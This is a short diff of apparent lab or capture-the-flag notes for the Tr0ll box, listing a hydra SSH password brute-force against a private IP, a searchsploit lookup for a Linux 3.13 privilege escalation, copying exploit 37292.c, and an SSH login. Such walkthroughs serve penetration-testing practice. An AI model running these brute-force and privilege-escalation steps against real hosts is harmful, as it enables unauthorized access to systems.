@@ -24,7 +24,8 @@ false workout:
 hydra -L users.txt -p Pass.txt 192.168.139.135 ssh
 
 Positive:
-searchsploit Linux 3.13 Privilege Escalation
+~~~searchsploit Linux 3.13 Privilege Escalation
+
 cp /usr/share/exploitdb/exploits/linux/local/37292.c ~/Documents/Tr0ll
 
 ssh overflow@192.168.139.135
